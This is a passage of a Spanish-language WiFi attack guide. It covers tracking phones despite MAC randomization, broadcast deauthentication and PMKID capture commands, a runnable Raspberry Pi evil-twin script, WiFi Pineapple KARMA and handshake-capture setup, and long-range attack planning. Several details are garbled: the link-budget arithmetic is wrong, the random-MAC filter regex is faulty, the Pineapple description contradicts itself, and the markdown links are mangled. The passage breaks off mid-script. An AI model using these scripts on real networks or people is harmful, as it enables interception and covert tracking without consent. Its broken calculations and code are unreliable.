| [hackrf](../raw/sdr-t3l3c0ms.md#hackrf)-t3l3c0ms.md#[hackrf](../raw/sdr-t3l3c0ms.md#hackrf)) One | [sdr](../raw/sdr-t3l3c0ms.md) (1MHz-6GHz) | $$$ | Alta |
| LimeSDR Mini | SDR (10MHz-3.5GHz) | $$$$ | Alta |
| BladeRF 2.0 | SDR (47MHz-6GHz) | $$$$$ | Alta |
| Flipper Zero | Sub-1GHz, BT, NFC, [rfid](../raw/ph7s1c4l-r3d.md#rfid) | $$ | Baja |
| Proxmark3 | RFID, NFC | $$ | Media |
| USRP B210 | SDR (70MHz-6GHz) | $$$$$$ | Muy Alta |

---

## MAC Address Randomization — Análisis Detallado

Los sistemas operativos modernos ([android](../raw/4db-d33p-d1v3.md) 10+, [ios](../raw/10s-p3nt3st1ng.md) 14+, Windows 10/11, macOS Ventura+) usan MAC aleatorias cuando escanean [wifi](../raw/w1f1-4tt4cks.md). Esto cambió completamente el juego del tracking de clientes.

### Cómo Funciona la Randomización

```bash
# Por SO:
# Windows 10/11:
#   - Randomización activada por defecto desde Windows 10 1803
#   - MAC aleatoria por cada SSID (no por escaneo)
#   - Usa OUI de Microsoft (00:15:5D, 00:50:F2, 28:CF:E9)
#   - En redes corporativas se puede desactivar por GPO

# iOS (14+):
#   - MAC aleatoria por cada SSID
#   - Usa OUI privado (02:00:00, 06:00:00, DA:A1:19, etc.)
#   - La MAC privada cambia cada 24 horas aprox
#   - iOS 17+: randomización también en probe requests

# Android (10+):
#   - MAC aleatoria por SSID desde Android 10
#   - Android 12+: randomización de probe requests
#   - Usa OUI aleatorios (no identificables)
#   - La MAC cambia por conexión en algunas versiones

# Linux (wpa_supplicant + NetworkManager):
#   - Soporte desde wpa_supplicant 2.10
#   - No activado por defecto en todas las distros
#   - MAC aleatoria por SSID configurable
```

### Cómo Identificar MACs Aleatorias

```bash
# Patrones de MACs aleatorias:
# 1. Segundo bit del primer byte = 1 (bit local)
#    x2:xx:xx:xx:xx:xx, x6:xx:xx:xx:xx:xx, xA:xx:xx:xx:xx:xx, xE:xx:xx:xx:xx:xx
#    Ejemplos: 02:00:00:00:00:00, 06:00:00:00:00:00, 0A:00:00:00:00:00
# 2. Primer byte termina en 2, 6, A, E (bit universal/local = 1)

# En capturas de probe requests:
tshark -r probes.pcap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid | sort | uniq

# Filtrar MACs aleatorias:
# Con awk:
tshark -r probes.pcap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa | awk -F: '{
    first_byte = $1
    # Si el segundo nibble es 2,6,A,E o el primer byte es 02,06,0A,0E
    if (first_byte ~ /^[026Aae].$/ || first_byte ~ /^[026Aae][026Aae]/)
      print $0 " (aleatoria)"
    else
      print $0 " (real)"
  }'

# Detección rápida:
# Las MACs reales tienen primer byte como 00, 04, 08, 0C, 10, 14, 18, 1C, 20, 24...
# Las MACs aleatorias tienen primer byte con bit 2 puesto (02, 06, 0A, 0E, 12, 16...)
```

### Tracking Bypass — Cómo Trackear a Pesar de Randomización

```bash
# Técnica 1: Elementos de Information Elements (IEs)
# Cada probe request contiene IEs únicos que forman un fingerprint
# Combinación de:
# - Supported Rates
# - Extended Supported Rates
# - HT Capabilities (802.11n)
# - VHT Capabilities (802.11ac)
# - HE Capabilities (802.11ax)
# - Power Capabilities
# - MIMO configuration
# Aunque la MAC cambie, los IEs son iguales para el mismo dispositivo

# Técnica 2: Sequence Number Analysis
# Cada paquete WiFi tiene un Sequence Number (0-4095) que incrementa
# Si capturás un paquete con seq=1000 y después otro con seq=1001,
# son del mismo dispositivo aunque la MAC sea diferente
tshark -r captura.pcap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.seq

# Técnica 3: Timing Analysis
# El intervalo entre probe requests es único por dispositivo
# Dispositivo A: probes cada 200ms exactos
# Dispositivo B: probes cada 500ms +- jitter

# Técnica 4: Chipset Fingerprinting
# Cada chipset WiFi (Broadcom, Atheros, Intel, Realtek, Mediatek)
# implementa el stack 802.11 de forma ligeramente diferente:
# - Orden de IEs en probe request
# - Valores predeterminados de HT/VHT capabilities
# - Timing de reintentos
# - Manejo de ACK

# Técnica 5: RSSI + Angle of Arrival
# Si tenés múltiples antenas, triangulás por RSSI
# La posición del dispositivo es más estable que la MAC

# Script de tracking por sequence number:
python3 << 'EOF'
from scapy.all import *

def track_packet(pkt):
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4:
        seq = pkt.sc
        sa = pkt.addr2
        # El seq number identifica al dispositivo
        # aunque la MAC sea diferente
        print(f"SEQ: {seq} MAC: {sa} RSSI: {pkt.dBm_AntSignal}")

sniff(iface="wlan0mon", prn=track_packet, store=0)
EOF
```

### Técnicas para Obtener la MAC Real

```bash
# Método 1: Asociación exitosa
# Cuando un cliente se ASOCIA a un AP (no solo escanea),
# usa su MAC real (o la MAC específica del SSID)
# Capturá Association Requests/Reassociation Requests
tshark -r captura.pcap -Y "wlan.fc.type_subtype == 0" \
  -T fields -e wlan.sa -e wlan.ssid
# Association Request (type 0) usa la MAC real

# Método 2: Análisis de EAPOL
# El 4-way handshake contiene MACs reales del cliente
tshark -r handshake.pcap -Y "eapol" -T fields \
  -e wlan.sa -e wlan.da

# Método 3: Timing de conectividad
# Si un cliente se conecta a un AP que vos controlás,
# la MAC de la conexión es la real
```

### Windows 10/11 — Randomización Específica

```bash
# Windows usa 3 tipos de MAC:
# 1. MAC real (física) — usada solo cuando es necesario
# 2. MAC aleatoria por SSID — persistente para cada red
# 3. MAC aleatoria temporal — para escaneo

# Windows puede desactivar randomización por red:
# Settings -> Network & Internet -> WiFi -> [Red] -> Random hardware addresses
# O por GPO:
# Computer Configuration\Administrative Templates\Network\WLAN Service
# \WLAN Settings\Enable MAC randomization

# En escaneo, Windows envía probe requests con:
# - MAC aleatoria
# - SSID de redes conocidas (esto SÍ se puede usar para tracking)
# - IEs específicos de Windows (Microsoft Corporation OUI)
```

### iOS Randomization — Específico

```bash
# iOS 14+:
# - MAC privada por SSID (persistente)
# - NO es aleatoria cada conexión
# - Cambia cada 24h o al olvidar la red

# iOS 17+:
# - Randomización también en probe requests (antes no)
# - Limita información en probes (solo SSIDs conocidos)

# Detectar iOS por IEs:
# iOS incluye "Apple OUI" en algunos elementos
# iOS no incluye "Country Information Element" (muchos otros SO sí)
```

### Android 10+ Randomization

```bash
# Android 10+:
# - MAC aleatoria por SSID
# - Android 12+: también en probes
# - OUI aleatorio (no identificable)

# Android usa "NetworkRequest" para escaneo
# Envía probes con MAC aleatoria pero SSIDs reales

# Detectar Android por:
# - IEs específicos (WFA, ANQP)
# - Tamaño de probe request (suele ser más grande que iOS)
# - DHCP fingerprint (si lográs capturar DHCP)
```

### Aplicación Práctica — Evadir Randomización en Ataques

```bash
# Si la MAC del cliente está randomizada:
# 1. No podés hacer deauth específico (no sabés la MAC real)
# 2. No podés trackear al cliente entre escaneos
# 3. No podés identificar qué cliente es cuál

# Soluciones:
# 1. Deauth broadcast (funciona aunque no sepas la MAC)
aireplay-ng -0 10 -a AP_MAC wlan0mon
# El deauth va a FF:FF:FF:FF:FF:FF, el AP lo reenvía a todos

# 2. PMKID attack (no necesita cliente)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# 3. Deauth dirigido al AP (con MAC del cliente randomizada no funciona)

# 4. Forzar al cliente a revelar su MAC real:
#    Configurás un Evil Twin con WPA2 (WPA3 transition)
#    El cliente se conecta con su MAC real
#    Ahora tenés la MAC real + handshake capturado
```

---

## Frame Injection — Problemas y Soluciones

### Verificar Inyección

```bash
# Test simple
aireplay-ng -9 wlan0mon
# Si dice "Injection is working!", todo bien

# Más detallado
aireplay-ng -9 -e RED_OBJETIVO -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Problemas Comunes de Inyección

1. **"No such device"**: [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) incorrecto o no cargado
2. **"Operation not supported"**: chipset no soporta inyección
3. **"Write failed: Cannot assign requested address"**: interfaz no está en modo monitor
4. **Los paquetes se envían pero no llegan**: señal débil o MIMO/beamforming
5. **Inyección funciona pero no se captura [handshake](../raw/w1f1-4tt4cks.md#handshake)**: channel hopping o PMF activado

### Soluciones

```bash
# 1. Bajar/Subir interfaz
ip link set wlan0mon down
sleep 2
ip link set wlan0mon up

# 2. Re-cargar driver
modprobe -r nombre_driver && modprobe nombre_driver

# 3. Cambiar rate de transmisión
iw dev wlan0mon set bitrates legacy-2.4 6  # Forzar 6Mbps

# 4. Deshabilitar 802.11n features
iw dev wlan0mon set bitrates legacy-2.4 11
# El modo legacy es más compatible
```

---

## Hardware Hacking Platforms — Guía Completa

### [raspberry pi](../raw/ph7s1c4l-r3d.md#raspberry-pi-p4wn)) como [wifi](../raw/w1f1-4tt4cks.md) Hacking Device — Setup Completo

La Raspberry Pi es la plataforma más versátil para pentesting WiFi portátil. Chica, consume poca energía y corre todo Linux.

```bash
# Hardware recomendado:
# - Raspberry Pi 4 (4GB) o Raspberry Pi 5
# - Alfa AWUS036ACH (USB 3.0)
# - Batería externa 20000mAh+ (con salida QC 3.0 o PD)
# - Antena externa omnidireccional 9dBi
# - Antena panel 14dBi (para largo alcance)
# - Carcasa con disipador (el Pi calienta)
# - Mini pantalla OLED (opcional, para status)

# Instalación desde cero (Raspberry Pi OS Lite):
# 1. Flashear imagen a SD
# 2. Configurar SSH y WiFi
cat > /boot/firmware/config.txt << EOF
# Enable USB 3.0 en Pi 5 (más throughput)
dtparam=pciex1_gen=3
EOF

# 3. Instalar herramientas:
apt update
apt install -y aircrack-ng reaver bully mdk4 bettercap hcxdumptool \
  hcxpcapngtool hashcat tmux git build-essential cmake python3-pip \
  tshark macchanger dnsmasq hostapd

# 4. Instalar driver RTL8812AU:
apt install -y realtek-rtl88xxau-dkms

# 5. Configurar SSH:
systemctl enable ssh
systemctl start ssh

# 6. Configurar wpa_supplicant para conectarse a internet por WiFi onboard:
cat > /etc/wpa_supplicant/wpa_supplicant.conf << EOF
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
country=AR
network={
    ssid="MiRedControl"
    psk="mi_contraseña"
    priority=1
}
EOF

# 7. En interfaces, el WiFi onboard (wlan0) va en managed
#    El adaptador USB (wlan1) va en modo monitor

# 8. Script de auto-configuración:
cat > /usr/local/bin/wifi-hack-start.sh << 'EOF'
#!/bin/bash
# Matar procesos que interfieren
airmon-ng check kill
# Activar modo monitor en adaptador USB
ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
# Fijar canal (lo cambiás según lo que estés atacando)
iw dev wlan1 set channel 6
echo "Modo monitor activado en wlan1"
# Verificar
iw dev wlan1 info
EOF
chmod +x /usr/local/bin/wifi-hack-start.sh
```

#### Power Budget — Cuánto Consume Cada Componente

```bash
# Estimaciones de consumo para plataforma portátil:
# Raspberry Pi 4:                  ~3-6W (sin USB load)
# Alfa AWUS036ACH (TX activo):    ~2.5W
# Alfa AWUS036NH (TX activo):     ~2W
# Pantalla HDMI (opcional):       ~3-5W
# Ventilador:                     ~0.5W
# Adaptadores USB extra:          ~1W c/u

# Total estimado con adaptador + vents: ~8-12W
# Power bank 20000mAh (74Wh a 3.7V):
# Asumiendo 90% eficiencia de conversión:
# Tiempo estimado: 74Wh * 0.9 / 10W ≈ 6.6 horas

# Power bank 30000mAh (111Wh):
# Tiempo estimado: ~10 horas (sesión completa de wardriving)

# Power bank 50000mAh (185Wh):
# Tiempo estimado: ~16 horas

# Recomendación: TP-Link UE330 o RAVPower RP-PB059
# Tienen salida QC 3.0 a 12V para el Pi 5
```

#### Configuración de [red](../raw/r3d3s-f0nd4m3nt0s.md) para Ataques

```bash
# El Pi tiene DOS interfaces de red:
# - wlan0 (onboard): se conecta a internet para que vos accedas por SSH
# - wlan1 (USB): modo monitor para atacar
# 
# También podés configurar wlan1 como Evil Twin:
# El Pi hostea un AP falso, vos te conectás al AP falso
# y desde ahí controlás el ataque

# Configurar wlan1 como Evil Twin + internet sharing:
cat > /usr/local/bin/evil-twin-pi.sh << 'EOF'
#!/bin/bash
INTERNET_IF="wlan0"
MONITOR_IF="wlan1"
SSID="WiFi-Libre"
CHANNEL=6

# IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configurar hostapd
cat > /tmp/hostapd.conf << HOSTAPD
interface=$MONITOR_IF
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
wpa=2
wpa_passphrase=contraseña123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
HOSTAPD

# Configurar dnsmasq
cat > /tmp/dnsmasq.conf << DNSMASQ
interface=$MONITOR_IF
dhcp-range=192.168.2.10,192.168.2.100,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
DNSMASQ

# NAT con iptables
iptables -t nat -A POSTROUTING -o $INTERNET_IF -j MASQUERADE
iptables -A FORWARD -i $INTERNET_IF -o $MONITOR_IF -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $MONITOR_IF -o $INTERNET_IF -j ACCEPT

# Iniciar servicios
hostapd /tmp/hostapd.conf -B
dnsmasq -C /tmp/dnsmasq.conf
echo "Evil twin listo en SSID: $SSID, IP: 192.168.2.1"
EOF
chmod +x /usr/local/bin/evil-twin-pi.sh
```

### WiFi Pineapple — Guía Completa

El WiFi Pineapple (Hak5) es el dispositivo más popular para pentesting WiFi. Hay 3 generaciones principales:

#### Pineapple Nano

```bash
# Especificaciones:
# - Atheros AR9331 @ 400MHz
# - 64MB RAM
# - 2x radios (2.4GHz + 2.4GHz)
# - 1x Ethernet
# - USB 2.0
# - MicroSD slot

# Ideal para: ataques portátiles, KARMA, captura de handshakes
# Precio: ~$100
```

#### Pineapple Tetra

```bash
# Especificaciones:
# - Atheros AR9344 @ 560MHz
# - 128MB RAM
# - 4x radios (2.4GHz x2 + 5GHz x2)
# - 1x Ethernet Gigabit
# - USB 2.0
# - 2x u.FL externas

# Ideal para: ataques avanzados, dual-band, WPA3
# Precio: ~$200
```

#### Pineapple EVO (WiFi 6)

```bash
# Especificaciones:
# - IPQ4019 @ 717MHz quad-core
# - 512MB RAM
# - WiFi 6 (802.11ax)
# - 2.4GHz + 5GHz (hasta 4 flujos)
# - 2x Ethernet Gigabit
# - USB 3.0
# - M.2 para expansión

# Ideal para: ataques WiFi 6, alta velocidad, procesamiento on-device
# Precio: ~$500
```

#### Configuración del Pineapple

```bash
# Interfaz web: http://172.16.42.1:1471
# O en la red del Pineapple: http://172.16.42.1:1471

# Primer setup:
# 1. Conectarse al SSID "Pineapple_XXXX" 
# 2. Abrir 172.16.42.1:1471
# 3. Configurar contraseña admin
# 4. Configurar WiFi upstream (Internet)
# 5. Ir a Modules -> Install

# Módulos esenciales:
# - PineAP: el core de KARMA (responder a probes)
# - Recon: escaneo de redes
# - Evil Portal: captive portal
# - SSLStrip: HTTPS downgrade
# - DNS Spoof: falsificar DNS
# - WPS: WPS attacks
# - Handshaker: captura automática de handshakes
# - WPA3 Manager: para redes WPA3

# PineAP Configuration:
# 1. Enable PineAP
# 2. Allow Broadcast SSID: ON
# 3. Beacon Response: ON (responde a probes)
# 4. Disable MAC Filter: ON (espacio libre)
# 5. Capture Handshakes: ON (automático)
# 6. Karma: ON (responder a probes de cualquier SSID)

# Capturar handshakes con PineAP:
# Los handshakes se guardan en:
# /root/pineapple/logs/handshakes/*.pcap
# 
# Se pueden descargar desde la web:
# En: PineAP -> Download Handshakes
```

#### Pineapple — Comandos Avanzados via SSH

```bash
# SSH al Pineapple
ssh root@172.16.42.1

# Ver logs
tail -f /var/log/pineap/pineap.log

# PineAP CLI (no tiene interfaz web)
pineap recon
pineap reporting
pineap target AA:BB:CC:DD:EE:FF

# Habilitar/deshabilitar componentes
pineap setting PineAP/beaconResponse 1
pineap setting PineAP/karma 1
pineap setting PineAP/beaconInterval 100
pineap setting PineAP/responseInterval 500

# Captura de handshakes manual
pineap handshake AA:BB:CC:DD:EE:FF -c 6 -w /tmp/

# Ver handshakes capturados
pineap handshakes

# Configurar filtro (solo responder a ciertos SSIDs)
pineap filter add SSID_MiObjetivo

# Bloquear clientes específicos
pineap deny CLIENT_MAC
```

### Flipper Zero — Módulo WiFi

El Flipper Zero tiene un módulo WiFi (basado en ESP32-S2) que se puede usar para ataques básicos:

```bash
# Flipper Zero + ESP32 Marauder
# Flashear Marauder al ESP32 del Flipper:
# 1. Poner Flipper en DFU mode
# 2. Usar web flasher o ESPTool

# Después de flashear:
# Menu -> GPIO -> WiFi Marauder

# Capacidades:
# - Escaneo de redes
# - Captura de beacons y probes
# - Deauth (solo redes sin PMF)
# - Beacon flood
# - WPS scan
# - Evil Portal (limitado)
# - WiFi sniffing básico

# Limitaciones del Flipper:
# - No soporta 5GHz
# - Poca potencia TX
# - No puede capturar handshakes WPA2 (no soporta modo monitor completo)
# - No inyección confiable en modo monitor
# - Más una herramienta de demostración que de ataque real
```

### PC Engines APU2

```bash
# Hardware:
# - AMD GX-412TC quad-core
# - 4GB RAM
# - 3x miniPCIe slots
# - 1x mSATA
# - 2x Gigabit Ethernet
# - GPIO header

# Ideal para: estación de wardriving fija, WIDS, WIPS
# Consumo: ~10W
# Precio: ~$150 (placa sola)

# Se pueden instalar 3 radios WiFi:
# - 1x Atheros AR9280 (monitoreo 2.4+5GHz)
# - 1x Compex WLE300NX (ataque 2.4GHz)
# - 1x Compex WLE600VX (ataque 5GHz)

# Software:
# - OpenWRT + herramientas de pentesting
# - Kali Linux (con kernel compilado para APU2)
# - pfSense (como router + WIDS)

# Setup típico:
# 1. Instalar OpenWRT
# 2. Opkg install aircrack-ng hcxdumptool mdk4
# 3. Configurar radios: uno en monitor, otro en managed, otro en AP
# 4. Correr scripts automáticos de capture
```

### Comparación Completa de Plataformas

| Dispositivo | Precio | Potencia | Consumo | Peso | Autonomía | WiFi 6 | GPS |
|-------------|:------:|:--------:|:------:|:----:|:---------:|:------:|:---:|
| Laptop (Kali) | $$ | Muy Alta | 30-60W | 2kg | 3-5h | ✅ | ✅ |
| Raspberry Pi 4 | $ | Media | 6W | 50g | 8-12h | ❌ | USB |
| Raspberry Pi 5 | $$ | Alta | 10W | 60g | 5-8h | ❌ | USB |
| Pineapple Nano | $$ | Media-Baja | 3W | 100g | 12-20h | ❌ | ❌ |
| Pineapple Tetra | $$$ | Alta | 5W | 150g | 8-12h | ❌ | ❌ |
| Pineapple EVO | $$$$ | Muy Alta | 8W | 200g | 5-8h | ✅ | ❌ |
| Flipper Zero | $$ | Baja | 0.5W | 80g | 30+h | ❌ | ❌ |
| APU2 | $$ | Alta | 10W | 400g | 5-8h | Ext | USB |
| ESP32 | $ | Muy Baja | 0.3W | 10g | 100+h | ❌ | ❌ |
| Intel NUC | $$$ | Muy Alta | 15-28W | 500g | 2-4h | ✅ | USB |

### Construcción de una Plataforma de Ataque Portátil con [sdr](../raw/sdr-t3l3c0ms.md)

Para análisis de señal avanzado, podés agregar un SDR ([software defined radio](../raw/sdr-t3l3c0ms.md)):

```bash
# HackRF One (1MHz-6GHz)
# Capacidades:
# - Análisis espectral de banda completa
# - Captura de señales GPS, GSM, LTE
# - Transmisión de señales (TX)
# - Ancho de banda: 20MHz

# LimeSDR Mini (10MHz-3.5GHz)
# - Full duplex (TX y RX simultáneo)
# - Ancho de banda: 30MHz
# - Mejor para análisis 2.4GHz y 5GHz

# BladeRF 2.0 (47MHz-6GHz)
# - Full duplex
# - Ancho de banda: 56MHz
# - FPGA programable (procesamiento on-board)

# Software SDR:
apt install gnuradio gqrx-sdr hackrf libhackrf-dev
pip install urh

# Usar SDR para WiFi:
# - Analizar espectro 2.4GHz completo
# - Detectar canales más limpios
# - Identificar interferencia
# - Analizar señales no-WiFi (BT, Zigbee, RF)

# HackRF + WiFi:
# HackRF tiene suficiente ancho de banda para capturar
# un canal WiFi completo (20MHz)
# Pero NO puede demodular 802.11 (no tiene suficiente procesamiento)
# Para eso necesitás USRP o BladeRF con FPGA

# Ejemplo: espectro 2.4-2.5GHz con hackrf
hackrf_sweep -f 2400000000:2500000000 -w 500000 -l 32 -g 20 > sweep.csv
# Después graficar con Python
```

### Solar-Powered Attack Platform

```bash
# Para ataques de larga duración sin acceso a red eléctrica:
# Panel solar: 50-100W plegable (Bluetti, Jackery)
# Batería: 12V 100Ah LiFePO4 (1200Wh)
# Regulador de carga: MPPT (más eficiente que PWM)
# Inversor DC-DC: 12V a 5V/9V/12V para dispositivos

# Tiempo estimado con 100W panel + 100Ah batería:
# Raspberry Pi 4 + AWUS036ACH: ~6 días continuos
# Laptop (30W): ~40 horas
```

---

## [wifi](../raw/w1f1-4tt4cks.md) 6/6E (802.11ax) y [wifi](../raw/w1f1-4tt4cks.md) 7 (802.11be) — Nuevos Vectores de Ataque

Las nuevas generaciones WiFi trajeron mejoras de velocidad pero también nuevas superficies de ataque. Entenderlas es clave para pentesting moderno.

### WiFi 6 (802.11ax) — Características y Vulnerabilidades

```bash
# Principales cambios en 802.11ax:
# - OFDMA (Orthogonal Frequency Division Multiple Access)
# - MU-MIMO uplink y downlink
# - 1024-QAM modulación
# - TWT (Target Wake Time) — ahorro de energía
# - BSS Coloring — reducción de interferencia
# - Frame aggregation mejorado (A-MPDU + A-MSDU)
# - 20MHz, 40MHz, 80MHz, 160MHz canales

# Detectar WiFi 6:
airodump-ng wlan0mon --band abg
# Buscar "HE" (High Efficiency) en las capabilities
# En Wireshark: wlan.he
```

#### OFDMA Exploitation

OFDMA divide cada canal en subcanales (Resource Units - RUs) de diferentes tamaños:

```bash
# OFDMA permite que múltiples clientes transmitan simultáneamente
# en diferentes RUs del mismo canal

# Ataque: OFDMA Contention Bypass
# Si un atacante ocupa RUs específicos, puede:
# 1. Bloquear tráfico legítimo en RUs específicos
# 2. Priorizar sus propios paquetes
# 3. Causar colisiones en RUs de otros clientes

# No hay herramientas públicas para explotar OFDMA
# Se requiere driver modificado o SDR programable
# Investigación activa (paper: "OFDMA Security Analysis in 802.11ax")
```

#### MU-MIMO Attack Surface

MU-MIMO permite al AP transmitir a múltiples clientes simultáneamente:

```bash
# MU-MIMO envía beams diferentes a cada cliente en el mismo canal
# El atacante puede:
# 1. Escuchar beams dirigidos a otros clientes
# 2. Interferir beams seleccionados
# 3. Forzar al AP a usar SU-MIMO (menos eficiente)

# Beamforming feedback attack:
# El atacante envía información falsa de beamforming
# El AP calcula mal los haces -> todos reciben señal degradada

# MU-MIMO Group Management Attack:
# Manipular el grupo MU-MIMO para que todos los clientes
# reciban datos mezclados (escuchan streams de otros)
```

#### TWT (Target Wake Time) Manipulation

TWT permite a los clientes dormir la mayor parte del tiempo y despertar solo en slots asignados:

```bash
# TWT fue diseñado para ahorrar batería (IoT, smartphones)
# Pero introduce vulnerabilidades:

# Ataque 1: TWT Poisoning
# El atacante manda un TWT Setup falso al cliente
# El cliente se duerme hasta el próximo TWT (horas)
# Durante ese tiempo, no responde a nada
# Equivalente a un deauth silencioso

# Ataque 2: TWT Wake Time Hijacking
# El atacante modifica el tiempo de wake del TWT
# El cliente despierta en momentos incorrectos
# No recibe tráfico del AP -> desconexión

# Ataque 3: TWT DoS
# Mandar setup TWT a todos los clientes
# con wake interval muy largo (días)
# Los clientes dejan de responder

# Detectar TWT:
tshark -r captura.pcap -Y "wlan.he.twt" -T fields -e wlan.he.twt
```

### WiFi 6E — Banda de 6GHz

WiFi 6E extiende 802.11ax a la banda de 6GHz (5925-7125 MHz). Esto introduce desafíos y oportunidades:

```bash
# Características de 6GHz:
# - 59 canales de 20MHz
# - 29 canales de 40MHz
# - 14 canales de 80MHz
# - 7 canales de 160MHz
# - SIN interferencia de BT/microondas
# - Muy poca congestión (por ahora)
# - WPA3 OBLIGATORIO (no hay WPA2 en 6GHz)

# Monitoreo de 6GHz:
# Necesitás hardware compatible:
# - Intel AX210 (soporta)
# - Qualcomm QCNCM865
# - Mediatek MT7921/MT7922

# Verificar soporte 6GHz:
iw phy phy0 info | grep "5955 MHz\|6155 MHz\|6505 MHz\|6885 MHz"

# Si el hardware no soporta 6GHz, no podés escanearlo
# Los adaptadores WiFi 5 (y viejos) no ven señales de 6GHz
```

#### Ataques Específicos de 6GHz

```bash
# 1. AFC (Automated Frequency Coordination) Exploitation
# En 6GHz, los APs de baja potencia no necesitan AFC
# Los APs de alta potencia SÍ necesitan consultar una BD de AFC
# Si falsificás la respuesta de AFC, podés:
# - Hacer que un AP transmita en canales prohibidos
# - Causar interferencia con servicios de radio existentes

# 2. Scanning Limitation Attack
# El escaneo de 6GHz es lento porque hay 59 canales
# El atacante puede esconderse en canales de 6GHz
# que no están siendo monitoreados por WIPS

# 3. WPA3 Obligatorio
# En 6GHz, WPA3 es MANDATORIO
# No hay downgrade a WPA2 en 6GHz
# Pero los APs dual-band (5GHz+6GHz) pueden ser atacados
# en la banda de 5GHz con WPA2
```

### WiFi 7 (802.11be) — Extremely High Throughput

WiFi 7 es la generación más nueva (ratificada 2024). Trae cambios masivos:

```bash
# Características WiFi 7:
# - 320MHz canales (vs 160MHz en WiFi 6)
# - 4096-QAM modulación
# - MLO (Multi-Link Operation)
# - 16 flujos espaciales (vs 8)
# - 30 Gbps teóricos
# - Mínima latencia (~1ms)
```

#### MLO (Multi-Link Operation) Attacks

MLO permite que un dispositivo use múltiples bandas simultáneamente (2.4 + 5 + 6GHz):

```bash
# MLO es el cambio MÁS IMPORTANTE para seguridad:
# Un dispositivo conectado por MLO usa DOS enlaces simultáneos
# Ejemplo: enlace 1 en 2.4GHz, enlace 2 en 5GHz

# Ataque MLO 1: Link Hijacking
# El atacante toma control de UNO de los enlaces MLO
# El dispositivo sigue conectado por el otro enlace
# No detecta el ataque

# Ataque MLO 2: Link Degradation
# El atacante degrada UN enlace MLO (por interferencia/deauth)
# Todo el tráfico se redirige al otro enlace
# El atacante ahora puede interceptar más tráfico

# Ataque MLO 3: Key Reinstallation (MLO-KRACK)
# La rekey durante MLO es más compleja
# Posible reutilización de nonces en transiciones MLO
# Investigación en curso

# Ataque MLO 4: Traffic Splitting
# El atacante manipula qué tráfico va por cada enlace
# Enlace 1: tráfico de control (no cifrado)
# Enlace 2: tráfico de datos (cifrado)
# Separar el control de los datos permite MITM

# MLO está en implementación temprana
# Muchos dispositivos WiFi 7 tienen bugs en MLO
```

#### WiFi 7 — Consideraciones de Seguridad

```bash
# WiFi 7 usa:
# - WPA3 obligatorio (no hay WPA2 en WiFi 7 puro)
# - PMF obligatorio
# - SAE obligatorio
# - OFDMA mejorado
# - 4096-QAM (más susceptible a interferencia)

# Para pentesters WiFi 7:
# - Necesitás hardware WiFi 7 (Intel BE200, Qualcomm FastConnect)
# - Necesitás drivers actualizados (Kernel 6.5+)
# - Las herramientas de pentesting existentes pueden no soportar WiFi 7
# - Se requiere desarrollo de herramientas específicas para MLO

# Herramientas que funcionan parcialmente con WiFi 7:
# - airodump-ng: funciona (modo legado)
# - hcxdumptool: funciona en modo legado
# - hashcat: solo si el handshake usa modos compatibles
```

---

## Long-Range [wifi](../raw/w1f1-4tt4cks.md) Attacks — Ataques de Larga Distancia

Para atacar [redes](../raw/r3d3s-f0nd4m3nt0s.md) WiFi a más de 1km necesitás equipo especializado y configuración cuidadosa.

### Presupuesto de Enlace — Cálculo Completo

Antes de comprar nada, calculá si tu ataque es viable:

```bash
# Fórmula completa de presupuesto de enlace:
# RSSI(dBm) = TX_Power(dBm) + TX_Antena_Gain(dBi) - Cable_Loss(dB) 
#             - FSPL(dB) + RX_Antena_Gain(dBi) 
#             - Foliage_Loss(dB) - Building_Loss(dB)

# Ejemplo: AP a 3km en 2.4GHz
# AP TX Power: 20 dBm
# AP Antenna: 3 dBi (típico router doméstico)
# FSPL a 3km en 2.4GHz: 20*log10(3) + 20*log10(2442) + 32.44 = 109.6 dB
# Atacante Antenna: 24 dBi (parabólica de rejilla)
# Cable Loss (atacante): 1 dB (LMR-400, 5m)
# Foliage: 3 dB (un par de árboles)
# 
# RSSI = 20 + 3 - 0 + 109.6 + 24 - 1 - 3
#      = -66.6 dBm
# 
# Esto es BUENO. Con -67 dBm la captura de paquetes es confiable.
# 
# Mismo ejemplo en 5GHz:
# FSPL a 3km en 5GHz: 20*log10(3) + 20*log10(5180) + 32.44 = 116.2 dB
# RSSI = 20 + 3 - 0 + 116.2 + 24 - 2.2 - 3
#      = -74.4 dBm
# 
# Aún funciona, pero más justo.
```

### Direccionales — Alineación de Precisión

```bash
# El mayor desafío de las antenas direccionales de alta ganancia:
# el ángulo del haz es MUY angosto.

# Yagi 18dBi: haz de ~15-20°
# Panel 20dBi: haz de ~20-30°
# Parabólica 24dBi: haz de ~8-12°
# Grid 30dBi: haz de ~5-8°

# Ejemplo: con parabólica 24dBi a 2km:
# El haz cubre un área de:
# ancho = 2km * tan(10°) * 2 = ~350 metros de ancho
# Eso es manejable.

# Con grid 30dBi a 2km:
# ancho = 2km * tan(5°) * 2 = ~175 metros
# Mucho más preciso. Cualquier movimiento de la antena
# y perdés la señal.

# Técnicas de alineación:
# 1. Montar la antena en trípode robusto
# 2. Apuntar aproximadamente con brújula + Google Maps
# 3. Usar airodump-ng para ver RSSI en tiempo real
# 4. Ajustar en pasos de 1-2 grados
# 5. Esperar 5-10 segundos entre ajustes (el RSSI actualiza lento)

# Script de ayuda:
cat > align_antenna.sh << 'EOF'
#!/bin/bash
BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
IFACE="wlan0mon"

# Fijar canal
iw dev $IFACE set channel $CHANNEL

echo "Alineando antena para BSSID $BSSID..."
echo "Ajustá 1-2° por vez y esperá 10 segundos"
echo "Mejor RSSI = más cerca de 0"

while true; do
  clear
  echo "RSSI actual:"
